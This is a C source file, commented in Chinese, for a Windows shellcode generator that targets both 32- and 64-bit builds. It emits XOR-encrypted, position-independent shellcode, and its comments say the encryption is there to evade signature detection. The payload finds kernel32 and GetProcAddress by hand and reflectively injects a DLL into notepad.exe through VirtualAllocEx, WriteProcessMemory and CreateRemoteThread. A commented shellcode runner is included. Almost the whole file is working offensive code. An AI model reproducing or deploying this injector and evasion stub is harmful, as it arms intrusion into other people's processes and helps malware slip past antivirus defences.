// 32位与64位 通用的 windows she11code 生成工具。
// cmd> tcc tcc_autocreate_she11code.c
// cmd> gcc tcc_autocreate_she11code.c
// 编译及其简单，带有简单的自动生带有加解密的 shellcode 防止指纹探测。
//   可在编译前设置自己加解密的密码串，让你的 shellcode 变得更加多样，“防指纹探测”功能的增强。
// 只用修改中间那一块代码，按照中间那一块的代码规则即可开发属于自己的 shellcode。
// 编译后生成的 exe 程序直接执行，会在程序路径下生成一个 sh.bin 文件，即为我们需要的 shellcode。

// 语法依 at&t 语法，
// tcc 与 gcc 均能编译并且成功执行，值得注意的是，tcc 与 gcc 编译函数的方式稍微有点不太一样。所以下面有部分使用了宏定义处理
// 为了更强的兼容性，这里将不使用 naked 的函数处理方式，防止部分 gcc 无法编译通过的情况。
// （注意，这里使用的 gcc 是旧版本的 gcc，也就是那个安装 devcpp 时附带会安装的那个旧版本。 貌似是 4.9）
// （如果是高版本的 gcc 请留意一下在 gcc_autocreate_she11code.c 的不同实现，那里兼容 naked 的函数语法）
// （不得不说我一个c语言萌新TM也没想到不同版本竟然TMD不兼容）
// gcc 不同版本造成的影响只会影响到汇编的函数跳转部分，所以正常开发即可，遇到错误需要考虑是否会是汇编的问题。
// 这里的代码支持低版本的 gcc，并且这里支持64，32位的交叉编译。

// 编写 she11code 的代码需要注意的是
// 1) 不能直接使用函数获取函数的地址，需要通过一定的汇编获取 Kernel32 的地址
// 2) 后续找到 GetProcAddress LoadLibraryA 这两个函数的地址后续基本就需要这两个函数进行处理必要函数的获取
// 3) 使用那些函数的时候也需要注意，需要从函数声明的地方获取结构声明，所有“函数声明”不会影响生成的代码的顺序和 she11code 体积。
// 4) 另外 she11code 的编写中注意不能使用任何全局变量，并且函数内“字符串声明”的方式只能使用 char[] 来实现，
//    这是为了避免字符串由于编译器优化被放到其他地方从而 she11code 不完整。
// cmd> tcc tcc_autocreate_she11code.c
// 需要生成32位则在 tcc 命令行加上 -m32 。 生成的工具 tcc_autocreate_she11code.exe 执行后会生成 sh.bin 的文件(she11code)。

#include <stdio.h>
#include <windows.h>

// ENCRYPT 是否添加 shellcode 自动加解密，默认添加
// 也是为了防止 shellcode 内一些固定的函数产生的指纹被探测到使用的
#define ENCRYPT TRUE

// ENCRYPTKEY 密码串，0-255 的数字列表；
// 如果是64位的 shellcode ，可随意修改长度，
// 如果是32位的 shellcode ，尽量不要修改密码长度，原因可看 ShellcodeDecode 函数内注释。
#define ENCRYPTKEY {1,2,3,4,5,6,7,8,9}

HMODULE getKernel32();
FARPROC getProcAddress(HMODULE hModuleBase);
void ShellcodeStart();
void ShellcodeEntry();
void ShellcodeEnd();
void CreateShellcode();
char* ShellcodeEncode(int size);
void ShellcodeDecode();

// create shellcode bin.
// int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow) {
int main(int argc, char const *argv[]) {
    #ifdef _WIN64
    printf("kernel32:       %016llx\n", getKernel32());
    printf("GetProcAddress: %016llx\n", getProcAddress((HMODULE)getKernel32()));
    #else
    printf("kernel32:       %016lx\n", getKernel32());
    printf("GetProcAddress: %016lx\n", getProcAddress((HMODULE)getKernel32()));
    #endif
    CreateShellcode();
}
void CreateShellcode(){
    HANDLE hBin = CreateFileA("sh.bin", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    DWORD dwSize;
    DWORD dwWrite;
    if (hBin == INVALID_HANDLE_VALUE){
        printf("%s error:%d\n", "create sh.bin fail.", GetLastError());
        return;
    }
    if (ENCRYPT){
        // 自动加密处理，让生成的 shellcode 自带加密，在执行过程中会自动解密再运行
        WriteFile(hBin, ShellcodeDecode, ShellcodeStart - ShellcodeDecode, &dwWrite, NULL);
        printf("ShellcodeSize:  %16d\n", dwWrite); // 写入解密头
        char* newShellcode = ShellcodeEncode(ShellcodeEnd - ShellcodeStart);
        WriteFile(hBin, newShellcode, ShellcodeEnd - ShellcodeStart, &dwWrite, NULL);
        printf("ShellcodeSize:  %16d\n", dwWrite); // 写入加密的 shellcode
    }else{
        dwSize = ShellcodeEnd - ShellcodeStart;
        WriteFile(hBin, ShellcodeStart, dwSize, &dwWrite, NULL);
        printf("ShellcodeSize:  %16d\n", dwWrite);
    }
}

// 因为在64位系统中，函数地址用的是相对地址，所以直接用 ((char*)ShellcodeStart)[i-20] ^= 233 就能修改
// 然而在32位系统中，这些地址都是绝对地址，所以需要通过一定的计算才能获取到真实的 ShellcodeStart 地址
// 在32和64位系统中，如果编译函数的执行，使用的都是短跳转，所以两种系统下的执行都直接使用 ShellcodeStart() 即可。
char* ShellcodeEncode(int size){
    char* temp = (char *)malloc(size* sizeof(char));
    int i = 0;
    int keys[] = ENCRYPTKEY;
    for(;i < size; i++){
        temp[i] = ((char*)ShellcodeStart)[i] ^ keys[i%(sizeof(keys)/sizeof(int))];
    }
    return temp;
}
void ShellcodeDecode(){
    int i = 20;
    int keys[] = ENCRYPTKEY;
    #ifdef _WIN64
    while (i < (int)(ShellcodeEnd-ShellcodeStart)+20){
        ((char*)ShellcodeStart)[i-20] ^= keys[(i-20)%(sizeof(keys)/sizeof(int))];
        i ++;
    }
    #else
    int _addr;
        #ifdef __MINGW32__
        asm("mov 64(%esp), %eax;"); // gcc编译32位时，这里 esp 前面的数字没有看出规律，因为这不太好调试，你只要使用 64->9 这一条即可。
        #else
        asm("mov 60(%esp), %eax;"); // tcc编译32位时，这里 esp 前面的数字需要随密码长度同步修改：24+9*4=60（9是当前密码长度）
        #endif
    asm("mov %%eax, %0;":"=a"(_addr));
    _addr = _addr + ShellcodeStart-ShellcodeDecode;
    while (i < (int)(ShellcodeEnd-ShellcodeStart)+20){
        ((char*)_addr)[i-20] ^= keys[(i-20)%(sizeof(keys)/sizeof(int))];
        i++;
    }
    #endif
    ShellcodeStart(); // TINYC use this
}
// shellcode
void ShellcodeStart(){
    #ifdef __MINGW32__
        #ifdef _WIN64
        asm("pop %rbp"); 
        asm("jmp ShellcodeEntry");
        #else
        asm("pop %ebp"); 
        asm("jmp _ShellcodeEntry"); // old style. fuck!
        #endif
    #else
    ShellcodeEntry(); // TINYC use this
    #endif
}















#include<stdio.h>
#include<windows.h>
#include<tlhelp32.h>
#include<string.h>

typedef FARPROC (WINAPI* FN_GetProcAddress)( HMODULE hModule, LPCSTR lpProcName );
typedef HMODULE (WINAPI* FN_LoadLibraryA)( LPCSTR lpLibFileName );
typedef int (WINAPI* FN_MessageBoxA)( HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType );
typedef LPVOID (WINAPI* FN_VirtualAllocEx)(HANDLE hProcess,LPVOID lpAddress,SIZE_T dwSize,DWORD flAllocationType,DWORD flProtect);
typedef WINBOOL (WINAPI* FN_VirtualFreeEx)(HANDLE hProcess,LPVOID lpAddress,SIZE_T dwSize,DWORD dwFreeType);
typedef HANDLE (WINAPI* FN_OpenProcess)(DWORD dwDesiredAccess,WINBOOL bInheritHandle,DWORD dwProcessId);
typedef HANDLE (WINAPI* FN_CreateRemoteThread)(HANDLE hProcess,LPSECURITY_ATTRIBUTES lpThreadAttributes,SIZE_T dwStackSize,LPTHREAD_START_ROUTINE lpStartAddress,LPVOID lpParameter,DWORD dwCreationFlags,LPDWORD lpThreadId);
typedef WINBOOL (WINAPI* FN_WriteProcessMemory)(HANDLE hProcess,LPVOID lpBaseAddress,LPCVOID lpBuffer,SIZE_T nSize,SIZE_T *lpNumberOfBytesWritten);
typedef WINBOOL (WINAPI* FN_CloseHandle)(HANDLE hObject);
typedef LPVOID (WINAPI* FN_MapViewOfFile)(HANDLE hFileMappingObject,DWORD dwDesiredAccess,DWORD dwFileOffsetHigh,DWORD dwFileOffsetLow,SIZE_T dwNumberOfBytesToMap);
typedef HANDLE (WINAPI* FN_CreateFileMappingA)(HANDLE hFile,LPSECURITY_ATTRIBUTES lpFileMappingAttributes,DWORD flProtect,DWORD dwMaximumSizeHigh,DWORD dwMaximumSizeLow,LPCSTR lpName);
typedef HANDLE (WINAPI* FN_CreateFileA)(LPCSTR lpFileName,DWORD dwDesiredAccess,DWORD dwShareMode,LPSECURITY_ATTRIBUTES lpSecurityAttributes,DWORD dwCreationDisposition,DWORD dwFlagsAndAttributes,HANDLE hTemplateFile);
typedef HANDLE (WINAPI* FN_CreateToolhelp32Snapshot)(DWORD dwFlags,DWORD th32ProcessID);
typedef WINBOOL (WINAPI* FN_Process32First)(HANDLE hSnapshot,LPPROCESSENTRY32 lppe);
typedef WINBOOL (WINAPI* FN_Process32Next)(HANDLE hSnapshot,LPPROCESSENTRY32 lppe);
typedef int (__cdecl* FN_strcmp)(const char *_Str1,const char *_Str2);
typedef int (__cdecl* FN_sprintf)(char *_Dest,const char *_Format,...);
typedef struct _FUNCTION {
    FN_GetProcAddress           fn_GetProcAddress;
    FN_LoadLibraryA             fn_LoadLibraryA;
    FN_CreateFileA              fn_CreateFileA;
    FN_MessageBoxA              fn_MessageBoxA;
    FN_VirtualAllocEx           fn_VirtualAllocEx;
    FN_VirtualFreeEx            fn_VirtualFreeEx;
    FN_OpenProcess              fn_OpenProcess;
    FN_CreateRemoteThread       fn_CreateRemoteThread;
    FN_WriteProcessMemory       fn_WriteProcessMemory;
    FN_CloseHandle              fn_CloseHandle;
    FN_MapViewOfFile            fn_MapViewOfFile;
    FN_CreateFileMappingA       fn_CreateFileMappingA;
    FN_CreateToolhelp32Snapshot fn_CreateToolhelp32Snapshot;
    FN_Process32First           fn_Process32First;
    FN_Process32Next            fn_Process32Next;
    FN_strcmp                   fn_strcmp;
    FN_sprintf                  fn_sprintf;
}FUNCTION, *PFUNCTION;
void InitFunctions(PFUNCTION pFn){
    char szUser32[]                   = {'u','s','e','r','3','2','\0'};
    char szKernel32[]                 = {'k','e','r','n','e','l','3','2','\0'};
    char szLoadLibraryA[]             = {'L','o','a','d','L','i','b','r','a','r','y','A','\0'};
    char szMessageBoxA[]              = {'M','e','s','s','a','g','e','B','o','x','A','\0'};
    char szmsvcrt[]                   = {'m','s','v','c','r','t','\0'};
    char szstrcmp[]                   = {'s','t','r','c','m','p','\0'};
    char szsprintf[]                  = {'s','p','r','i','n','t','f','\0'};
    char szVirtualAllocEx[]           = {'V','i','r','t','u','a','l','A','l','l','o','c','E','x','\0'};
    char szVirtualFreeEx[]            = {'V','i','r','t','u','a','l','F','r','e','e','E','x','\0'};
    char szOpenProcess[]              = {'O','p','e','n','P','r','o','c','e','s','s','\0'};
    char szCreateRemoteThread[]       = {'C','r','e','a','t','e','R','e','m','o','t','e','T','h','r','e','a','d','\0'};
    char szWriteProcessMemory[]       = {'W','r','i','t','e','P','r','o','c','e','s','s','M','e','m','o','r','y','\0'};
    char szCloseHandle[]              = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
    char szMapViewOfFile[]            = {'M','a','p','V','i','e','w','O','f','F','i','l','e','\0'};
    char szCreateFileMappingA[]       = {'C','r','e','a','t','e','F','i','l','e','M','a','p','p','i','n','g','A','\0'};
    char szCreateFileA[]              = {'C','r','e','a','t','e','F','i','l','e','A','\0'};
    char szCreateToolhelp32Snapshot[] = {'C','r','e','a','t','e','T','o','o','l','h','e','l','p','3','2','S','n','a','p','s','h','o','t','\0'};
    char szProcess32First[]           = {'P','r','o','c','e','s','s','3','2','F','i','r','s','t','\0'};
    char szProcess32Next[]            = {'P','r','o','c','e','s','s','3','2','N','e','x','t','\0'};
    pFn->fn_GetProcAddress            = (FN_GetProcAddress)getProcAddress((HMODULE)getKernel32());
    pFn->fn_LoadLibraryA              = (FN_LoadLibraryA)            pFn->fn_GetProcAddress((HMODULE)getKernel32(), szLoadLibraryA);
    pFn->fn_MessageBoxA               = (FN_MessageBoxA)             pFn->fn_GetProcAddress(pFn->fn_LoadLibraryA(szUser32), szMessageBoxA);
    pFn->fn_VirtualAllocEx            = (FN_VirtualAllocEx)          pFn->fn_GetProcAddress(pFn->fn_LoadLibraryA(szKernel32), szVirtualAllocEx);
    pFn->fn_VirtualFreeEx             = (FN_VirtualFreeEx)           pFn->fn_GetProcAddress(pFn->fn_LoadLibraryA(szKernel32), szVirtualFreeEx);
    pFn->fn_OpenProcess               = (FN_OpenProcess)             pFn->fn_GetProcAddress(pFn->fn_LoadLibraryA(szKernel32), szOpenProcess);
    pFn->fn_CreateRemoteThread        = (FN_CreateRemoteThread)      pFn->fn_GetProcAddress(pFn->fn_LoadLibraryA(szKernel32), szCreateRemoteThread);
    pFn->fn_WriteProcessMemory        = (FN_WriteProcessMemory)      pFn->fn_GetProcAddress(pFn->fn_LoadLibraryA(szKernel32), szWriteProcessMemory);
    pFn->fn_CloseHandle               = (FN_CloseHandle)             pFn->fn_GetProcAddress(pFn->fn_LoadLibraryA(szKernel32), szCloseHandle);
    pFn->fn_MapViewOfFile             = (FN_MapViewOfFile)           pFn->fn_GetProcAddress(pFn->fn_LoadLibraryA(szKernel32), szMapViewOfFile);
    pFn->fn_CreateFileMappingA        = (FN_CreateFileMappingA)      pFn->fn_GetProcAddress(pFn->fn_LoadLibraryA(szKernel32), szCreateFileMappingA);
    pFn->fn_CreateFileA               = (FN_CreateFileA)             pFn->fn_GetProcAddress(pFn->fn_LoadLibraryA(szKernel32), szCreateFileA);
    pFn->fn_CreateToolhelp32Snapshot  = (FN_CreateToolhelp32Snapshot)pFn->fn_GetProcAddress(pFn->fn_LoadLibraryA(szKernel32), szCreateToolhelp32Snapshot);
    pFn->fn_Process32First            = (FN_Process32First)          pFn->fn_GetProcAddress(pFn->fn_LoadLibraryA(szKernel32), szProcess32First);
    pFn->fn_Process32Next             = (FN_Process32Next)           pFn->fn_GetProcAddress(pFn->fn_LoadLibraryA(szKernel32), szProcess32Next);
    pFn->fn_strcmp                    = (FN_strcmp)                  pFn->fn_GetProcAddress(pFn->fn_LoadLibraryA(szmsvcrt), szstrcmp);
    pFn->fn_sprintf                   = (FN_sprintf)                 pFn->fn_GetProcAddress(pFn->fn_LoadLibraryA(szmsvcrt), szsprintf);
}
void WKMessageBox(PFUNCTION pFn){
    pFn->fn_MessageBoxA(NULL,NULL,NULL,0);
}



#ifdef _WIN64
    #define ULONGLONG ULONGLONG
    #define PULONGLONG PULONGLONG
#else
    #define ULONGLONG ULONG
    #define PULONGLONG PULONG
#endif
typedef struct _PE_INFO {
    LPVOID  base;
    BOOL    reloc;
    LPVOID  Get_Proc;
    LPVOID  Load_DLL;
}PE_INFO , *LPE_INFO;
LPVOID Read_in_Memory(char* FileName, PFUNCTION pFn) {
    HANDLE f,h;
    LPVOID m;
    if ((f = pFn->fn_CreateFileA(FileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE){
        return NULL;
    }
    if ((h = pFn->fn_CreateFileMappingA(f,NULL,PAGE_READONLY,0,0,NULL)) == NULL){
        return NULL;
    }
    if ((m = pFn->fn_MapViewOfFile(h,FILE_MAP_READ,0,0,0)) == NULL){
        return NULL;
    }
    return m;
}
HANDLE Find_Process(char* process_name, PFUNCTION pFn) {
    BOOL found = 0;
    HANDLE snap, proc;
    PROCESSENTRY32 ps;
    ps.dwSize = sizeof(ps);
    if((snap = pFn->fn_CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0)) == INVALID_HANDLE_VALUE){
        return NULL;
    }
    if(!pFn->fn_Process32First(snap,&ps)){
        return NULL;
    }
    do {
        if(!pFn->fn_strcmp(process_name,ps.szExeFile)) {
            found = 1;
            break;
        }
    }while(pFn->fn_Process32Next(snap,&ps));
    pFn->fn_CloseHandle(snap);
    if(!found)
        return NULL;
    if((proc = pFn->fn_OpenProcess(PROCESS_ALL_ACCESS,0,ps.th32ProcessID)) == NULL) {
        return NULL;
    }else{
        return proc;
    }
}
void AdjustPE(LPE_INFO pe) {
    PIMAGE_DOS_HEADER           dos;
    PIMAGE_NT_HEADERS           nt;
    LPVOID                      base;
    PIMAGE_IMPORT_DESCRIPTOR    import;
    PIMAGE_THUNK_DATA           Othunk,Fthunk;
    PIMAGE_BASE_RELOCATION      reloc;
    PIMAGE_TLS_DIRECTORY        tls;
    PIMAGE_TLS_CALLBACK*        CallBack;
    ULONGLONG*                  p,delta;
    BOOL        (*DLL_Entry)    (LPVOID, DWORD, LPVOID);
    LPVOID      (*Load_DLL)     (LPSTR);
    LPVOID      (*Get_Proc)     (LPVOID, LPSTR);
    base       = pe->base;
    Load_DLL   = pe->Load_DLL;
    Get_Proc   = pe->Get_Proc;
    dos        = (PIMAGE_DOS_HEADER)base;
    nt         = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    DLL_Entry  = base+nt->OptionalHeader.AddressOfEntryPoint;
    if(pe->reloc){
        if(nt->OptionalHeader.DataDirectory[5].VirtualAddress != 0){
            delta = (ULONGLONG)base-nt->OptionalHeader.ImageBase;
            reloc = (PIMAGE_BASE_RELOCATION)(base+nt->OptionalHeader.DataDirectory[5].VirtualAddress);
            while(reloc->VirtualAddress) {
                LPVOID  dest    = base+reloc->VirtualAddress;
                int     nEntry  = (reloc->SizeOfBlock-sizeof(IMAGE_BASE_RELOCATION))/2;
                PWORD   data    = (PWORD)((LPVOID)reloc+sizeof(IMAGE_BASE_RELOCATION));
                int i;
                for(i = 0; i<nEntry; i++,data++) {
                    if(((*data) >> 12) == 10) {
                        p = (PULONGLONG)(dest+((*data)&0xfff));
                        *p += delta;
                    }
                }
                reloc = (PIMAGE_BASE_RELOCATION)((LPVOID)reloc+reloc->SizeOfBlock);
            }
        }
    }
    if(nt->OptionalHeader.DataDirectory[1].VirtualAddress != 0){
        import = (PIMAGE_IMPORT_DESCRIPTOR)(base+nt->OptionalHeader.DataDirectory[1].VirtualAddress);
        while(import->Name) {
            LPVOID dll = (*Load_DLL)(base+import->Name);
            Othunk = (PIMAGE_THUNK_DATA)(base+import->OriginalFirstThunk);
            Fthunk = (PIMAGE_THUNK_DATA)(base+import->FirstThunk);
            if(!import->OriginalFirstThunk){
                Othunk = Fthunk;
            }
            while(Othunk->u1.AddressOfData) {
                if(Othunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                    *(ULONGLONG *)Fthunk = (ULONGLONG)(*Get_Proc)(dll,(LPSTR)IMAGE_ORDINAL(Othunk->u1.Ordinal));
                }
                else {
                    PIMAGE_IMPORT_BY_NAME fnm = (PIMAGE_IMPORT_BY_NAME)(base+Othunk->u1.AddressOfData);
                    *(PULONGLONG)Fthunk = (ULONGLONG)(*Get_Proc)(dll,fnm->Name);
                }
                Othunk++;
                Fthunk++;
            }
            import++;
        }
    }
    if(nt->OptionalHeader.DataDirectory[9].VirtualAddress != 0){
        tls = (PIMAGE_TLS_DIRECTORY)(base+nt->OptionalHeader.DataDirectory[9].VirtualAddress);
        if(tls->AddressOfCallBacks != 0){
            CallBack = (PIMAGE_TLS_CALLBACK *)(tls->AddressOfCallBacks);
            while(*CallBack) {
                (*CallBack)(base,DLL_PROCESS_ATTACH,NULL);
                CallBack++;
            }
        }
    }
    (*DLL_Entry)(base,DLL_PROCESS_ATTACH,NULL);
}
void loaddllrun(PFUNCTION pFn){
    int i;
    HANDLE      proc;
    LPVOID      base,Rbase,Adj;
    DWORD       Func_Size;
    PE_INFO     pe;
    PIMAGE_DOS_HEADER       dos;
    PIMAGE_SECTION_HEADER   sec;
    PIMAGE_NT_HEADERS       nt;
    // 这里的环境极其糟糕，只能用下面的方式弹出错误内容
    // char errorlog[80] = {0};
    // char sformat[] = {'%','x','\0'};
    // pFn->fn_sprintf(errorlog, sformat, base);
    // pFn->fn_MessageBoxA(0,errorlog,errorlog,0);

    // 将dll文件 dllfilename 读入内存并注入到进程名为 injectproc 的进程中。
    // 不过可以尝试直接将 dll 文件的二进制包裹进 shellcode 里面，用起来会方便挺多
    // 之所以不把全部的功能都用 shellcode 来实现，因为 shellcode 开发调试起来非常麻烦。
    char dllfilename[] = {'t','e','s','t','.','d','l','l','\0'};
    char injectproc[] = {'n','o','t','e','p','a','d','.','e','x','e','\0'};
    base = Read_in_Memory(dllfilename, pFn);

    dos = (PIMAGE_DOS_HEADER)base;
    if(dos->e_magic != 23117) {
        return;
    }
    nt = (PIMAGE_NT_HEADERS)(base+dos->e_lfanew);
    sec = (PIMAGE_SECTION_HEADER)((LPVOID)nt+24+nt->FileHeader.SizeOfOptionalHeader);
    if(nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR_MAGIC) {
        return;
    }
    if((proc = Find_Process(injectproc, pFn)) == NULL) {
        return;
    }
    pe.reloc = 0;
    if((Rbase = pFn->fn_VirtualAllocEx(proc,(LPVOID)nt->OptionalHeader.ImageBase,nt->OptionalHeader.SizeOfImage,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE)) == NULL) {
        pe.reloc = 1;
        if((Rbase = pFn->fn_VirtualAllocEx(proc,NULL,nt->OptionalHeader.SizeOfImage,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE)) == NULL) {
            return;
        }
    }
    pFn->fn_WriteProcessMemory(proc,Rbase,base,nt->OptionalHeader.SizeOfHeaders,NULL);
    for(i = 0; i<nt->FileHeader.NumberOfSections; i++) {
        pFn->fn_WriteProcessMemory(proc,Rbase+sec->VirtualAddress,base+sec->PointerToRawData,sec->SizeOfRawData,NULL);
        sec++;
    }
    Func_Size = (DWORD)((ULONGLONG)loaddllrun-(ULONGLONG)AdjustPE);
    pe.base = Rbase;
    pe.Get_Proc = pFn->fn_GetProcAddress;
    pe.Load_DLL = pFn->fn_LoadLibraryA;
    Adj = pFn->fn_VirtualAllocEx(proc,NULL,Func_Size+sizeof(pe),MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
    if(Adj == NULL) {
        pFn->fn_VirtualFreeEx(proc,Rbase,0,MEM_RELEASE);
        return;
    }
    pFn->fn_WriteProcessMemory(proc, Adj, &pe, sizeof(pe), NULL);
    pFn->fn_WriteProcessMemory(proc, Adj+sizeof(pe), AdjustPE, Func_Size, NULL);
    pFn->fn_CreateRemoteThread(proc, NULL, 0, (LPTHREAD_START_ROUTINE)(Adj+sizeof(pe)), Adj, 0, NULL);
    return;
}

void ShellcodeEntry(){
    FUNCTION fn;
    InitFunctions(&fn);
    loaddllrun(&fn);
}




















// 后面是获取 kernel32 地址以及获取 GetProcAddress 函数地址的两个重要函数
// 同时适配了 tcc/gcc 的 32/64 位的编译情况。请勿修改！
#ifdef _WIN64
HMODULE getKernel32(){
    asm("mov %gs:(0x60), %rax");
    asm("mov 0x18(%rax), %rax");
    asm("mov 0x20(%rax), %rax");
    asm("mov (%rax), %rax");
    asm("mov (%rax), %rax");
    asm("mov 0x20(%rax), %rax");
    #ifdef __MINGW32__
    asm("pop %rbp"); // sometime you cannot use naked func, this is for more compatibility.
    asm("ret"); // TINYC dnot need this
    #endif
}
#else
HMODULE getKernel32(){
    asm("mov %fs:(0x30), %eax");
    asm("mov 0x0c(%eax), %eax");
    asm("mov 0x14(%eax), %eax");
    asm("mov (%eax), %eax");
    asm("mov (%eax), %eax");
    asm("mov 0x10(%eax), %eax");
    #ifdef __MINGW32__
    asm("pop %ebp"); // sometime you cannot complier naked func, this is for more compatibility.
    asm("ret"); // TINYC dnot need this
    #endif
}
#endif
FARPROC getProcAddress(HMODULE hModuleBase){
    LPBYTE lpBaseAddr = (LPBYTE)hModuleBase;
    PIMAGE_DOS_HEADER lpDosHdr = (PIMAGE_DOS_HEADER)lpBaseAddr;
    PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)(lpBaseAddr + lpDosHdr->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(lpBaseAddr + pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    LPDWORD pNameArray = (LPDWORD)(lpBaseAddr + pExportDir->AddressOfNames);
    LPDWORD pAddrArray = (LPDWORD)(lpBaseAddr + pExportDir->AddressOfFunctions);
    LPWORD pOrdArray = (LPWORD)(lpBaseAddr + pExportDir->AddressOfNameOrdinals);
    FARPROC GetProcAddressAPI;
    UINT i = 0;
    for (; i < pExportDir->NumberOfNames; i++){
        LPSTR pFuncName = (LPSTR)(lpBaseAddr + pNameArray[i]);
        if (    pFuncName[0] == 'G' &&
                pFuncName[1] == 'e' &&
                pFuncName[2] == 't' &&
                pFuncName[3] == 'P' &&
                pFuncName[4] == 'r' &&
                pFuncName[5] == 'o' &&
                pFuncName[6] == 'c' &&
                pFuncName[7] == 'A' &&
                pFuncName[8] == 'd' &&
                pFuncName[9] == 'd' &&
                pFuncName[10] == 'r' &&
                pFuncName[11] == 'e' &&
                pFuncName[12] == 's' &&
                pFuncName[13] == 's'     ){
            GetProcAddressAPI = (FARPROC)(lpBaseAddr + pAddrArray[pOrdArray[i]]);
            return GetProcAddressAPI;
        }
    }
    return NULL;
}
void ShellcodeEnd(){
}



// 测试 shellcode 的工具的代码
// // 注意，编译工具编译的环境，32位的 shellcode 只能使用 32位编译出来的工具
// #include <stdio.h>
// #include <windows.h>
// #pragma comment(lib, "user32")
// int main(int argc, char const *argv[]) {
//     HANDLE hFile = CreateFileA(argv[1], GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, NULL);
//     if (hFile == INVALID_HANDLE_VALUE){
//         printf("error:%d\n", GetLastError());
//         return -1;
//     }
//     DWORD dwSize;
//     dwSize = GetFileSize(hFile, NULL);
//     LPVOID lpAddress = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
//     if (lpAddress == NULL){
//         printf("error:%d\n", GetLastError());
//         CloseHandle(hFile);
//         return -1;
//     }
//     DWORD dwRead;
//     ReadFile(hFile, lpAddress, dwSize, &dwRead, 0);
//     ((void(*)(void))lpAddress)();
//     MessageBoxA(NULL,"this box is show means that shellcode dnot kill this execute.", "test", 0);
//     return 0;
// }